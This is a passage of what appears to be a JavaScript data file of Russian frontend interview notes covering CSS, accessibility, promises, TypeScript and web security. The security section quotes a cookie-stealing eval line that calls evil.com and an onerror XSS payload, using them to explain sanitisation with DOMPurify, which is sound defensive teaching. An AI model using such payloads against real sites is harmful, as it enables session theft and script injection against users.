2. Родитель и первый/последний ребёнок — если нет border/padding/overflow между ними
3. Пустой блок — его margin-top коллапсирует с margin-bottom

**Как предотвратить:** добавить padding/border на родителя, \`overflow: hidden\`, \`display: flex/grid\`.
Flexbox и Grid children **не коллапсируют** margins — одна из причин почему grid/flex так удобны.`,score:4},{name:"Семантичные теги, базовые теги",level:"1",content:`Семантические теги: header, main, footer, nav, section, article, aside, figure.

Семантика нужна для: доступности (скринридеры), SEO, читаемости кода.

**section** — блок с конкретной смысловой нагрузкой.
**article** — независимый контент (пост, комментарий).
**div** — нет семантики, для группировки/стилизации.`,score:4.5},{name:"Базовые CSS свойства",level:"1",content:`**display: none** — убирает из потока (нет размеров).
**visibility: hidden** — скрывает, но занимает место.
**opacity: 0** — скрывает, занимает место, реагирует на клики.

**position:** static (по умолчанию), relative (смещение от своего места), absolute (от ближайшего позиционированного предка), fixed (от viewport), sticky (гибрид relative + fixed).`,score:5},{name:"Специфичность селекторов",level:"2",content:`Формула **(a, b, c):**
• a = id
• b = классы, атрибуты, псевдоклассы
• c = теги, псевдоэлементы

\`!important > inline > #id > .class > tag\`

При равной специфичности → каскадность (позже = приоритетнее).`,score:4.5},{name:"Базовые псевдоклассы",level:"2",content:`**Псевдоклассы (:)** — состояние элемента: :hover, :active, :focus, :first-child, :nth-child(n), :not(), :checked, :disabled.

**Псевдоэлементы (::)** — виртуальный элемент: ::before, ::after, ::placeholder, ::selection.

**:nth-child(2)** — второй потомок вообще.
**:nth-of-type(2)** — второй элемент данного типа.

**:focus** — срабатывает при любом фокусе (мышь, клавиатура, программно).
**:focus-visible** — срабатывает только когда фокус виден пользователю — то есть при навигации с клавиатуры.

Зачем: кнопки при клике мышью получают :focus и показывают outline — это раздражает. С :focus-visible outline показывается только при навигации клавиатурой — удобно для accessibility.`,score:5},{name:"Типографика. Шрифты. Подключение шрифтов",level:"3",content:`**@font-face** — подключение локальных шрифтов:
\`\`\`css
@font-face {
  font-family: 'MyFont';
  src: url('./fonts/MyFont.woff2') format('woff2');
  font-display: swap;
}
\`\`\`

**Форматы:** woff2 (лучший, сжатие Brotli), woff (fallback), ttf/otf (старые).

**em vs rem:**
**em** — относительно размера шрифта родителя. Накапливается при вложенности:
\`\`\`css
/* Родитель 16px, дочерний 1.5em = 24px, внук 1.5em = 36px! */
\`\`\`
**rem** — относительно размера шрифта корневого элемента (html). Всегда предсказуемо:
\`\`\`css
html { font-size: 16px; }
.text { font-size: 1.5rem; } /* всегда 24px */
\`\`\`
Поэтому rem предпочтительнее для типографики.

**font-display:**
• **auto** — браузер решает сам
• **block** — текст невидим пока шрифт не загрузится (FOIT)
• **swap** — сразу показывает системный шрифт, потом меняет (FOUT) ✅ чаще всего используют
• **fallback** — короткий период невидимости (100ms), потом системный; если шрифт не успел — остаётся системный
• **optional** — браузер сам решает показывать кастомный шрифт или нет (зависит от скорости соединения)

swap — самый популярный выбор для производительности.`,score:3.5},{name:"PostCSS",level:"3",content:`**PostCSS** — инструмент для трансформации CSS через плагины.

Популярные плагины:
• **postcssPresetEnv** — современный CSS → полифилы (как Babel для CSS)
• **autoprefixer** — вендорные префиксы
• **postcssNested** — вложенность как в SASS
• **postcssMixins** — миксины
• **postcssImport** — @import`,score:4},{name:"Flexbox",level:"3",content:`Одномерная раскладка (строка ИЛИ колонка).

**Центрирование:** display: flex + justify-content: center + align-items: center.

**align-items** — внутри одной строки.
**align-content** — распределяет строки (только при flex-wrap: wrap).

**flex: 1** = flex-grow: 1, flex-shrink: 1, flex-basis: 0%.

**flex-grow** — как много элемент растёт относительно других.
**flex-shrink** — как много элемент сжимается.
**flex-basis** — начальный размер элемента.`,score:4},{name:"Базовое понимание контекста наложения",level:"3",content:`**z-index** работает с позиционированными элементами (relative, absolute, fixed, sticky). Может быть отрицательным.

**Stacking context** создаёт:
• position: absolute/relative/fixed/sticky + z-index не auto
• opacity < 1
• transform не none
• filter не none
• isolation: isolate
• will-change

Дочерний элемент соревнуется только внутри stacking context родителя.

**Главная ловушка** — z-index работает только внутри одного контекста наложения. Элемент с z-index: 9999 не перекроет элемент из другого контекста если его родитель имеет меньший z-index.`,score:3.5},{name:"Современные подходы к организации стилей",level:"3",content:`**CSS-Modules:** автоматические уникальные имена классов.
**CSS-in-JS (styled-components):** стили в JS, динамика через props. Минус: runtime-стоимость.
**Zero-runtime:** vanilla-extract, Linaria, Panda CSS — CSS-in-JS синтаксис, но компиляция в статичный CSS.`,score:3.5},{name:"Базовые свойства Grid",level:"3",content:`Двумерная раскладка (строки И колонки одновременно).

\`\`\`css
.grid {
  display: grid;
  grid-template-columns: 1fr 2fr 1fr;
  grid-template-rows: auto;
  gap: 16px;
}
\`\`\`

**fr** — доля свободного пространства: 1fr 2fr 1fr = 25% 50% 25%.

**grid-area** — размещение элемента по именованным областям.
**minmax(200px, 1fr)** — адаптивные колонки.

**auto-fill** — создаёт колонки даже если элементов нет, пустые колонки занимают место.
**auto-fit** — пустые колонки схлопываются до 0, существующие элементы растягиваются на всю ширину.`,score:4},{name:"Векторная и растровая графика",level:"4",content:`**Растровые форматы:**
• **JPG** — сжатие с потерями, для фото, нет прозрачности
• **PNG** — без потерь, поддерживает прозрачность, тяжелее JPG
• **WebP** — современный формат, меньше JPG/PNG при том же качестве, прозрачность есть
• **AVIF** — ещё новее, ещё лучше сжатие

**SVG:**
• Масштабируется без потери качества
• Можно анимировать через CSS/JS
• Индексируется поисковиками
• Может быть инлайн в HTML

**Когда что использовать:**
• **SVG** — иконки, логотипы, иллюстрации, анимации
• **WebP/AVIF** — фотографии, сложные изображения с градиентами
• **PNG** — когда нужна прозрачность и нет поддержки WebP

**Адаптивные изображения (srcset):**
\`\`\`html
<img
  src="img-800.webp"
  srcset="img-400.webp 400w, img-800.webp 800w, img-1600.webp 1600w"
  sizes="(max-width: 600px) 100vw, 50vw"
  loading="lazy"
  decoding="async"
  alt="..."
/>
\`\`\`
Браузер сам выбирает нужный размер — не грузит лишнего.

**picture с fallback:**
\`\`\`html
<picture>
  <source srcset="img.avif" type="image/avif">
  <source srcset="img.webp" type="image/webp">
  <img src="img.jpg" alt="...">
</picture>
\`\`\`

**SVG inline vs img:**
Inline SVG — можно анимировать и стилизовать через CSS, но не кэшируется.
\`\`\`html
<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24">
  <circle cx="12" cy="12" r="10" fill="currentColor"/>
</svg>
\`\`\`

img tag с SVG — кэшируется браузером, но нельзя стилизовать через CSS.
\`\`\`html
<img src="icon.svg" alt="icon" width="24" height="24">
\`\`\``,score:2},{name:"browserslist",level:"4",content:`Конфиг, определяющий целевые браузеры. Читают: Autoprefixer, Babel, PostCSS Preset Env, ESLint.

\`\`\`json
"browserslist": ["> 1%", "last 2 versions", "not dead"]
\`\`\`

• **> 1%** — браузеры с долей использования больше 1% глобально
• **last 2 versions** — последние 2 версии каждого браузера
• **not dead** — исключает браузеры без официальной поддержки более 2 лет

Все инструменты работают согласованно по одному конфигу.

**Где хранить:**
• **.browserslistrc** — отдельный файл
• **package.json** — поле "browserslist"
• **в конфиге инструмента** — например в postcss.config.js`,score:2.5},{name:"Доступность (aria, tabindex & etc.)",level:"4",content:`**tabindex:** 0 — в порядке DOM, -1 — только программно (focus()), положительный — антипаттерн.

**ARIA атрибуты:**
• **aria-label** — текстовое описание элемента для скринридера (когда нет видимого текста)
• **aria-hidden="true"** — скрывает элемент от скринридера (декоративные иконки)
• **aria-expanded** — состояние раскрытия (аккордеон, дропдаун)
• **aria-live** — объявляет динамические изменения (уведомления, ошибки)
• **role** — явно указывает роль элемента (role="button", role="dialog")

**Первое правило ARIA:** если есть нативный HTML-элемент — используй его вместо ARIA. button лучше чем div с role="button".

**Focus management:**
\`\`\`js
// При открытии модального окна — фокус внутрь
useEffect(() => { if (isOpen) modalRef.current?.focus(); }, [isOpen]);

// При закрытии — вернуть фокус на кнопку открытия
useEffect(() => { if (!isOpen) triggerRef.current?.focus(); }, [isOpen]);
\`\`\`

**Focus trap в модальном окне:**
\`\`\`html
<!-- Современный способ -->
<dialog> <!-- нативный <dialog> имеет встроенный focus trap --> </dialog>

<!-- Или inert атрибут на всё кроме модального -->
<div inert>Контент позади — недоступен Tab, клик, screen reader</div>
\`\`\`

**Клавиатурная навигация (стандарты):**
• Enter/Space — активация button/link
• Escape — закрыть модальное окно, dropdown
• Arrow keys — навигация внутри composite widget (меню, tabs, listbox)

**WCAG контраст:** 4.5:1 для обычного текста, 3:1 для крупного (18px+) и UI элементов.

**aria-live (live regions)** — объявления для screen reader при динамических обновлениях:
\`\`\`html
<div aria-live="polite">Загрузка завершена</div>     <!-- не прерывает чтение -->
<div aria-live="assertive">Критическая ошибка!</div>  <!-- прерывает сразу -->
\`\`\``,score:3}]},{id:"async",title:"АСИНХРОННОСТЬ",icon:"🔄",color:"#FF6B6B",topics:[{name:"XMLHttpRequest, fetch",level:"2",content:`**XMLHttpRequest** — колбэки. **fetch** — промисы.

**fetch при 404/500 — НЕ попадает в catch!** Только сетевые ошибки. Проверять response.ok.

\`\`\`js
fetch('/api').then(res => {
  if (!res.ok) throw new Error(res.status);
  return res.json();
}).catch(err => console.log(err));
\`\`\`

**Отмена запроса:**

 XHR — просто:
\`\`\`js
xhr.abort();
\`\`\`

fetch — через AbortController:
\`\`\`js
const controller = new AbortController();

fetch('/api/data', { signal: controller.signal });

// Отменяем запрос
controller.abort();
\`\`\`
AbortController универсальнее — работает с любым Promise-based API.`,score:3.5},{name:"Механизм Event loop, тасоки и микротасоки",level:"3",content:`**Один тик Event Loop:**
Макротаска → Все микротаски → rAF → Рендеринг → Следующая макротаска

**Микротаски:** Promise.then, queueMicrotask, MutationObserver. Опустошаются полностью.
**rAF:** requestAnimationFrame — перед рендером, НЕ микро и НЕ макро.
**Макротаски:** setTimeout, setInterval, I/O.

Микротаска может породить микротаску → выполнится до макротаски. Бесконечные микротаски → блокировка.`,score:4},{name:"async/await: Синтаксис, обработка ошибок",level:"3",content:`async-функция всегда возвращает Promise.

**await** разрезает функцию: до await — синхронно, после await — микротаска (.then()).

\`\`\`js
async function foo() { console.log(1); await x; console.log(2); }
console.log(3); foo(); console.log(4);
// 3, 1, 4, 2
\`\`\`

**Обработка ошибок:** try/catch или .catch() на промисе.

**return value vs return Promise.resolve(value):** второй на один микротик медленнее.

**Promise методы:**
• **Promise.all(promises)** — ждёт все, падает при первой ошибке. Результат: массив значений в том же порядке.
• **Promise.allSettled(promises)** — ждёт все, не падает. Результат: массив {status, value/reason}.
• **Promise.race(promises)** — возвращает первый завершившийся (fulfilled и rejected). Остальные игнорируются.
• **Promise.any(promises)** — возвращает первый успешный. Если все упали — AggregateError.
• **Promise.resolve(value)** — создаёт уже зарезолвленный Promise.
• **Promise.reject(reason)** — создаёт уже отклонённый Promise.

**Нюансы:**
\`\`\`js
Promise.race([rejected, resolved]) // вернёт rejected — первый завершился
Promise.any([rejected, resolved])  // вернёт resolved — первый успешный
\`\`\`
Promise.all — порядок результатов совпадает с порядком промисов, не с порядком завершения:
\`\`\`js
const [a, b] = await Promise.all([slowRequest, fastRequest]);
// a — результат slowRequest, b — fastRequest
\`\`\`
Promise.allSettled — никогда не попадёт в .catch().
Promise.any — единственный метод который бросает AggregateError (содержит массив всех ошибок).

**Цепочка .then().catch().finally():**
\`\`\`js
fetch('/api')
  .then(res => res.json())          // трансформация
  .catch(err => fallback)           // обработка ошибки, возвращает значение — цепочка продолжается!
  .finally(() => setLoading(false)) // выполняется всегда, не получает значение
\`\`\`

**После .catch() можно продолжить .then()** — если catch не бросает ошибку, цепочка восстанавливается:
\`\`\`js
fetch('/api')
  .then(res => res.json())
  .catch(err => ({ error: true }))  // вернули fallback-значение
  .then(data => render(data))       // выполнится с fallback-значением
\`\`\`
Если внутри .catch() сделать throw — следующие .then() будут пропущены до следующего .catch().`,score:4},{name:"Генераторы и итераторы",level:"4",content:`**Два протокола:**
• **Iterable** — объект с методом [Symbol.iterator]() возвращающим итератор
• **Iterator** — объект с методом next() возвращающим { value, done }

**Ручная реализация итератора:**
\`\`\`js
const iterable = {
  [Symbol.iterator]() {
    let i = 0;
    return {
      next() {
        return i < 3
          ? { value: i++, done: false }
          : { value: undefined, done: true };
      }
    };
  }
};
\`\`\`

**Генератор** — автоматически реализует оба протокола:
\`\`\`js
function* gen() {
  const x = yield 'first';  // строка 1
  const y = yield 'second'; // строка 2
  return x + y;             // строка 3
}
const g = gen();
\`\`\`

**g.next()** — запуск (первый аргумент всегда игнорируется):
• Идёт до первого yield, возвращает \`{ value: 'first', done: false }\`
• Заморожен на строке 1

**g.next('world')** — продолжение:
• 'world' → результат yield 'first' → x = 'world'
• Идёт до следующего yield, возвращает \`{ value: 'second', done: false }\`

**g.next('!')** — продолжение:
• '!' → результат yield 'second' → y = '!'
• Идёт до return, возвращает \`{ value: 'world!', done: true }\`

**Правило:** то что передаёшь в next() — становится результатом предыдущего yield.

**yield* — делегирование:**
\`\`\`js
function* outer() {
  yield 0;
  yield* [1, 2, 3];  // массив
  yield* 'abc';       // строка
  yield* inner();     // другой генератор
}
[...outer()]; // [0, 1, 2, 3, 'a', 'b', 'c']
\`\`\`

**Что работает с итерируемыми:** for...of, [...spread], Array.from(), деструктуризация.
**Встроенные итерируемые:** Array, String, Map, Set, arguments, NodeList, генераторы.

**Практика:**
\`\`\`js
function* idGenerator() {
  let id = 1;
  while (true) yield id++;
}

function* range(start, end) {
  while (start <= end) yield start++;
}
for (const num of range(1, 5)) console.log(num); // 1 2 3 4 5
\`\`\`

**Применение:** Redux-Saga, бесконечные последовательности, ленивые вычисления. async/await под капотом — Babel компилирует в генераторы + промисы.`,score:2.5},{name:"Работа с запросами",level:"2",content:`**Промисы — цепочки:**
• .then() и .catch() всегда возвращают новый промис
• Ошибка пропускает все .then() до ближайшего .catch()
• .catch() без throw — «чинит» цепочку
• .finally() — всегда, не получает аргументов, пропускает значение дальше

**promise.then(ok, err) vs promise.then(ok).catch(err):**
В первом: err НЕ ловит ошибки из ok. Во втором: catch ловит всё.

**Promise combinators:**
\`\`\`js
// Все выполнятся — вернёт массив результатов. Один reject → всё reject.
const [user, posts] = await Promise.all([fetchUser(id), fetchPosts(id)]);

// Все выполнятся — вернёт массив { status, value/reason }. Никогда не reject.
const results = await Promise.allSettled([req1(), req2(), req3()]);
const ok = results.filter(r => r.status === 'fulfilled').map(r => r.value);

// Первый завершившийся (resolve ИЛИ reject) побеждает.
const data = await Promise.race([fetchFromPrimary(), fetchFromFallback()]);

// Первый resolve побеждает. Reject только если ВСЕ упали (AggregateError).
const fastest = await Promise.any([cdn1(), cdn2(), cdn3()]);
\`\`\`

**AbortController** — отмена fetch и любых async операций:
\`\`\`js
const controller = new AbortController();

fetch('/api/data', { signal: controller.signal })
  .catch(e => { if (e.name !== 'AbortError') throw e; });

controller.abort(); // отмена

// В React — отменяем при размонтировании (обязательный паттерн!)
useEffect(() => {
  const controller = new AbortController();
  fetch('/api', { signal: controller.signal }).then(setData);
  return () => controller.abort();
}, []);
\`\`\``}]},{id:"ts",title:"TS",icon:"🔷",color:"#3178C6",topics:[{name:"Основные типы данных в TS",level:"2",content:`**Примитивы:** string, number, boolean, null, undefined, bigint, symbol.

**TS-specific:**
• **any** — отключает проверку
• **unknown** — безопасный any, требует проверки типа
• **never** — функция никогда не завершится (throw, while(true))
• **void** — функция ничего не возвращает
• **tuple** — массив фиксированной длины: [string, number]
• **enum** — набор именованных констант`,score:3},{name:"Keyof, typeof",level:"2",content:`**keyof** — union ключей: keyof User → 'name' | 'age' (НЕ string!)
**typeof** (в TS) — выводит тип из значения: typeof user → { name: string; age: number }

**Комбинация:** keyof typeof obj → union ключей из значения.`,score:3.5},{name:"Interface vs types (extend, |, &)",level:"3",content:`**interface** — declaration merging (повторное объявление объединяется), extends.
**type** — расширение через &, union |, mapped types, conditional types.

**Union (|):** A или B (или оба).
**Intersection (&):** обязательно A и B.

type тоже можно implements в классах.`,score:3.5},{name:"Файлы деклараций .d.ts",level:"3",content:`**.d.ts** — файл только с типами, без реализации. TypeScript читает его чтобы знать что экспортирует модуль, но в JS-бандл он не попадает.

**Зачем нужны:**
JS-библиотека написана на JS — TypeScript не знает её типы. .d.ts даёт ему эту информацию. Можно типизировать любой JS-код не переписывая его.

**Три источника .d.ts:**

**1. Встроены в саму библиотеку** — авторы написали на TypeScript и скомпилировали:
\`\`\`json
// package.json библиотеки
{ "types": "./dist/index.d.ts" }
\`\`\`
TS находит это автоматически.

**2. @types/* пакеты** — отдельный пакет с декларациями для JS-библиотек:
\`\`\`bash
npm i -D @types/react @types/node
\`\`\`
PostedBy сообщество DefinitelyTyped. Устанавливаются как devDependency — в продакшн-бандл не попадают.

**3. Написаны вручную** — для своего JS-кода или внутренних модулей:
\`\`\`ts
// legacy.d.ts — типизируем старый JS-модуль
declare module './legacy/utils' {
  export function formatDate(date: Date): string;
  export function parseId(id: unknown): number;
}
\`\`\`

**declare — ключевое слово в .d.ts:**
Говорит TS "это существует в рантайме, доверяй мне":
\`\`\`ts
// Объявить переменную без значения:
declare const __DEV__: boolean;        // например, вшитая webpack-ом
declare function require(id: string): any;

// Объявить модуль (любой импорт этого пути → any):
declare module '*.svg' {
  const src: string;
  export default src;
}

// Объявить модуль с типами:
declare module 'my-lib' {
  export interface Options { timeout: number; }
  export function init(opts: Options): void;
}
\`\`\`

**declare global — расширение глобального namespace:**
\`\`\`ts
// Добавить свойство к window:
declare global {
  interface Window {
    analytics: Analytics;
    __APP_CONFIG__: AppConfig;
  }
}

// Или расширить существующий тип:
declare global {
  interface Array<T> {
    groupBy(key: keyof T): Record<string, T[]>;
  }
}
\`\`\`
Важно: declare global работает только внутри module-файла (с import/export). В глобальном файле — просто interface Window.

**Автогенерация .d.ts из своего кода:**
\`\`\`json
// tsconfig.json
{ "declaration": true, "declarationDir": "./dist/types" }
\`\`\`
При сборке библиотеки tsc генерирует .d.ts автоматически рядом с JS-файлами. Потребители получат типы без @types.

**Нюанс — ambient vs module declarations:**
Если .d.ts файл не содержит import/export — он ambient (глобальный), типы доступны везде без импорта. Если содержит import/export — это module, типы нужно импортировать явно.`,score:3},{name:"Механизм typeGuard, type cast",level:"3",content:"**Type Guard:** функция с type predicate:\n```ts\nfunction isCat(x: Cat | Dog): x is Cat { return 'meow' in x; }\n```\n\n**Type Cast:** as (основной) и <Type> (не работает в JSX).\nЭто утверждение, не преобразование — в рантайме ничего не происходит.",score:3.5},{name:"UtilityTypes",level:"3",content:`**Partial<T>** — все поля необязательны
**Required<T>** — все поля обязательны
**Readonly<T>** — все поля только для чтения
**Pick<T, K>** — выбирает поля K из T
**Omit<T, K>** — исключает поля K из T
**Record<K, V>** — объект с ключами K и значениями V
**Exclude<T, U>** — убирает из union T типы из U
**Extract<T, U>** — оставляет в union T только типы из U
**NonNullable<T>** — убирает null и undefined
**ReturnType<T>** — тип возврата функции
**Parameters<T>** — типы параметров функции как tuple
**InstanceType<T>** — тип экземпляра класса
**Awaited<T>** — разворачивает Promise
**ConstructorParameters<T>** — типы параметров конструктора`,score:4},{name:"Generics",level:"3",content:"Переиспользуемый код с разными типами:\n```ts\nfunction first<T>(arr: T[]): T { return arr[0]; }\n```\n\n**Ограничения (extends):**\n```ts\nfunction getProperty<T, K extends keyof T>(obj: T, key: K): T[K] {\n  return obj[key]; // TypeScript знает тип возврата\n}\n```\n\n**Дефолтные типы:**\n```ts\ninterface State<T = string> { value: T; }\ntype State1 = State;         // State<string>\ntype State2 = State<number>; // State<number>\n```\n\n**Conditional generics (зависимый возврат):**\n```ts\ntype Flatten<T> = T extends Array<infer Item> ? Item : T;\ntype A = Flatten<string[]>; // string\ntype B = Flatten<number>;   // number\n```\n\n**Variance (вариантность):**\n- **Covariant (ковариантный):** `Dog extends Animal` → `() => Dog` совместим с `() => Animal` (return types — ковариантны)\n- **Contravariant (контравариантный):** `(Animal) => void` → несовместим с `(Dog) => void` (параметры — контравариантны со `strictFunctionTypes`)\n```ts\ntype Logger<T> = (value: T) => void;\n// Если нужен Logger<Animal>, можно передать Logger<Animal>\n// но НЕ Logger<Dog> — т.к. Logger<Animal> ожидает любой Animal\n```",score:4},{name:"Template Literal Types",level:"3",content:`Строковые шаблоны в типах:
\`\`\`ts
type Event = 'click' | 'hover';
type Handler = \\\`on\${Capitalize<Event>}\\\`; // 'onClick' | 'onHover'
\`\`\`

Автоматическая генерация всех комбинаций из union. 
      **Capitalize<T>** — первая буква заглавная: 'hello' → 'Hello'
**Uncapitalize<T>** — первая буква строчная: 'Hello' → 'hello'
**Uppercase<T>** — всё заглавными: 'hello' → 'HELLO'
**Lowercase<T>** — всё строчными: 'HELLO' → 'hello'`,score:3.5},{name:"Conditional types, mapped types, infer",level:"4",content:`**Conditional:** T extends string ? 'yes' : 'no'
**Mapped:** [K in keyof T]?: T[K] — перебор ключей с трансформацией.
**infer:** вытаскивает тип из структуры:
\`\`\`ts
type ReturnType<T> = T extends (...args: any[]) => infer R ? R : never;
\`\`\`

**Distributive (разворачивается по union):**
\`\`\`ts
type ToArray<T> = T extends any ? T[] : never;
type A = ToArray<string | number>; // string[] | number[]

// Чтобы ОТКЛЮЧИТЬ distributive — обернуть в кортеж:
type ToArrayStrict<T> = [T] extends [any] ? T[] : never;
type B = ToArrayStrict<string | number>; // (string | number)[]
\`\`\`

**Mapped type modifiers (+/-):**
\`\`\`ts
type Mutable<T> = { -readonly [K in keyof T]: T[K] };   // убрать readonly
type Optional<T> = { [K in keyof T]+?: T[K] };           // добавить ?
type Required<T> = { [K in keyof T]-?: T[K] };           // убрать ?
\`\`\`

**infer для сложных структур:**
\`\`\`ts
type Unpacked<T> = T extends Promise<infer U> ? U : T;
type Head<T extends any[]> = T extends [infer H, ...any[]] ? H : never;
type Tail<T extends any[]> = T extends [any, ...infer R] ? R : never;

type H = Head<[string, number, boolean]>; // string
type T = Tail<[string, number, boolean]>; // [number, boolean]
\`\`\``,score:3},{name:"Перегрузка функций",level:"4",content:`**Зачем нужна перегрузка:**
Иногда функция ведёт себя по-разному в зависимости от типа аргументов — и возвращаемый тип тоже разный. Без перегрузки TypeScript вывел бы слишком широкий тип и потерял информацию:
\`\`\`ts
// Без перегрузки — TS не знает что именно вернётся:
function wrap(value: string | number): string | number[] { ... }
const result = wrap('hello'); // тип: string | number[] — неточно

// С перегрузкой — TS знает точно:
function wrap(value: string): string;
function wrap(value: number): number[];
function wrap(value: string | number): string | number[] {
  return typeof value === 'string' ? value.toUpperCase() : [value];
}
const a = wrap('hello'); // тип: string ✅
const b = wrap(42);     // тип: number[] ✅
\`\`\`

**Структура:**
\`\`\`ts
// 1. Сигнатуры перегрузок — только для TypeScript, в JS не существуют:
function format(value: string): string;
function format(value: number, decimals: number): string;

// 2. Сигнатура реализации — невидима снаружи, покрывает все варианты:
function format(value: string | number, decimals?: number): string {
  if (typeof value === 'string') return value.trim();
  return value.toFixed(decimals ?? 2);
}

// Вызвать можно только через сигнатуры перегрузок:
format('hello');    // ✅
format(3.14, 1);    // ✅
format(3.14);       // ❌ — не совпадает ни с одной сигнатурой
\`\`\`

**Порядок сигнатур важен — конкретные выше:**
\`\`\`ts
// ✅ Правильно: более конкретный тип выше
function parse(input: 'json'): object;
function parse(input: string): unknown;
function parse(input: string): object | unknown { ... }

// ❌ Неправильно: string поглощает 'json' раньше
function parse(input: string): unknown;
function parse(input: 'json'): object; // никогда не будет выбрана
\`\`\`

**Перегрузка методов класса:**
\`\`\`ts
class EventEmitter {
  on(event: 'data', handler: (data: Buffer) => void): this;
  on(event: 'error', handler: (err: Error) => void): this;
  on(event: string, handler: (...args: any[]) => void): this {
    // реализация
    return this;
  }
}
\`\`\`

**Когда использовать перегрузку, а когда union:**
\`\`\`ts
// Union достаточно — возвращаемый тип не зависит от входного:
function log(value: string | number): void { ... }

// Перегрузка нужна — возвращаемый тип зависит от входного:
function clone(value: string): string;
function clone(value: number): number;
function clone<T>(value: T): T { return value; }
\`\`\`

**Альтернатива — generic с conditional type** (мощнее, но сложнее читается):
\`\`\`ts
function clone<T extends string | number>(value: T): T {
  return value; // TS сохраняет литеральный тип
}
const x = clone('hello'); // тип: 'hello', не string
\`\`\``,score:3},{name:"Reference types",level:"4",content:`Reference types — директивы в начале файла для подключения типов:

**Triple-slash directives:**
\`\`\`ts
/// <reference types="node" />          // подключает @types/node
/// <reference path="./other.d.ts" />   // подключает конкретный файл
/// <reference lib="dom" />             // подключает встроенную библиотеку TS
\`\`\`

В tsconfig.json можно указать \`types\` или \`lib\` глобально для всего проекта.

**Reference директивы нужны когда:**
• Нужен тип только в одном файле — не хочешь подключать глобально
• Автоматически генерируемые .d.ts — компилятор сам добавляет reference чтобы указать зависимости
• Старые проекты — до того как tsconfig стал стандартом

Сейчас в большинстве проектов reference директивы не нужны — всё настраивается через tsconfig.json.`,score:3.5},{name:"Использование tsc",level:"4",content:`**tsc** — компилятор TypeScript. Проверяет типы + компилирует в JS.

**tsconfig.json ключевые настройки:**
• **strict: true** — зонтичный флаг (strictNullChecks, noImplicitAny, и др.)
• **target** — версия JS на выходе (ES5, ES6, ESNext)
• **module** — система модулей (commonjs, esnext)
• **paths** — алиасы импортов
• **include/exclude** — какие файлы компилировать

**strict: true включает:**
• **noImplicitAny** — нельзя неявный any
• **strictNullChecks** — null и undefined не совместимы с другими типами
• **strictFunctionTypes** — строгая проверка типов функций при присваивании
• **strictPropertyInitialization** — все поля класса должны быть инициализированы в конструкторе

**--noEmit** — проверяет типы но не генерирует JS файлы. Используется:
• В CI/CD для проверки типов без сборки
• Когда сборкой занимается другой инструмент (Vite, webpack) а TS только для типов
\`\`\`bash
tsc --noEmit         # только проверка типов
tsc --watch          # следит за изменениями
tsc --noEmit --watch # проверка типов в режиме слежения
\`\`\``,score:3.5}]},{id:"security",title:"БЕЗОПАСНОСТЬ",icon:"🔒",color:"#EF5350",topics:[{name:"eval, dangerouslySetInnerHTML",level:"2",content:`**eval() — выполняет строку как JS-код в рантайме:**
\`\`\`js
eval('alert(1)');              // выполнит alert
eval('fetch("evil.com?" + document.cookie)'); // украдёт куки
\`\`\`

**Почему опасно:**
Если в строку попадают пользовательские данные — атакующий может выполнить любой код с привилегиями текущей страницы: украсть cookies/localStorage, делать запросы от имени пользователя, менять DOM.

**Почему медленно:**
V8 не может оптимизировать код внутри eval — Hidden Classes, Inline Caching, JIT не работают. Плюс eval читает и модифицирует текущий scope — это блокирует ряд оптимизаций всей окружающей функции.

**Альтернативы:**
\`\`\`js
// Вместо eval для вычисления выражений:
new Function('x', 'return x * 2')(5); // изолирован от текущего scope

// Вместо eval для динамических ключей:
const key = 'name';
obj[key]; // просто доступ через переменную

// Вместо eval для JSON:
JSON.parse(str); // безопасно, только данные — не код
\`\`\`
\`new Function()\` тоже небезопасен для пользовательского ввода — изолирует от scope, но всё равно выполняет произвольный код.

---

**dangerouslySetInnerHTML — React-аналог innerHTML:**
\`\`\`jsx
// ❌ Опасно — если html пришёл от пользователя:
<div dangerouslySetInnerHTML={{ __html: userContent }} />
// Если userContent = '<img src=x onerror=alert(1)>' — XSS
\`\`\`

**Санитизация (sanitize)** — это очистка HTML от опасных тегов и атрибутов перед вставкой в DOM. Санитайзер парсит HTML и удаляет: теги \`<script>\`, обработчики событий (\`onerror\`, \`onclick\`, \`onload\`), \`javascript:\` в href/src, и другие векторы XSS.

**DOMPurify — стандартная библиотека для санитизации:**
\`\`\`js
import DOMPurify from 'dompurify';

// Базовое использование:
const clean = DOMPurify.sanitize(dirtyHtml);
// '<script>alert(1)<\/script><b>text</b>' → '<b>text</b>'
// '<img src=x onerror=alert(1)>' → '<img src=x>'

// Разрешить только определённые теги:
const clean = DOMPurify.sanitize(html, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
  ALLOWED_ATTR: ['href'],
});
\`\`\`

\`\`\`jsx
// ✅ Правильно — всегда санитизировать перед вставкой:
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />
\`\`\`

**Когда dangerouslySetInnerHTML вообще нужен:**
• Вывод rich-text из CMS (контент редактора — Quill, TipTap)
• Email-превью в браузере
• Статьи с форматированием из базы

Во всех случаях — только с санитизацией. React специально назвал пропс "dangerously" чтобы разработчик думал дважды.`,score:3.5},{name:"Аутентификация и авторизация, их отличия",level:"2",content:`**Аутентификация (Authentication)** — КТО ты? Проверка личности. Логин/пароль, OAuth, биометрия, токен.

**Авторизация (Authorization)** — ЧТО тебе можно? Проверка прав после того как личность установлена. Роли, permissions, scopes.

Сначала всегда аутентификация — потом авторизация. Без установленной личности незачем проверять права.

---

**Session-based аутентификация:**
\`\`\`
1. Пользователь вводит логин/пароль
2. Сервер проверяет, создаёт сессию в БД/Redis: { sessionId: 'abc', userId: 42, exp: ... }
3. Клиент получает httpOnly cookie с sessionId
4. При каждом запросе браузер автоматически шлёт cookie
5. Сервер смотрит sessionId → находит сессию → знает кто это
\`\`\`
Инвалидация мгновенная — удалил запись в Redis, сессия мертва. Минус: нужен общий Redis при горизонтальном масштабировании.

**JWT-аутентификация:**
\`\`\`
1. Пользователь логинится
2. Сервер создаёт JWT: header.payload.signature
3. Клиент хранит токен и шлёт в заголовке: Authorization: Bearer <token>
4. Сервер проверяет подпись — никакой БД не нужно (stateless)
\`\`\`
\`\`\`js
// Payload JWT (читаем кем угодно — не шифруется!):
{ userId: 42, role: 'admin', exp: 1716000000 }
\`\`\`
Плюс: stateless, легко масштабируется. Минус: нельзя мгновенно инвалидировать — токен живёт до истечения exp.

**Где хранить токены:**

**localStorage** — доступен из JS → украдут через XSS. Нельзя для access/refresh токенов.

**httpOnly cookie** — JS не может прочитать, браузер шлёт автоматически. Уязвим к CSRF, но защищается SameSite=Strict/Lax.

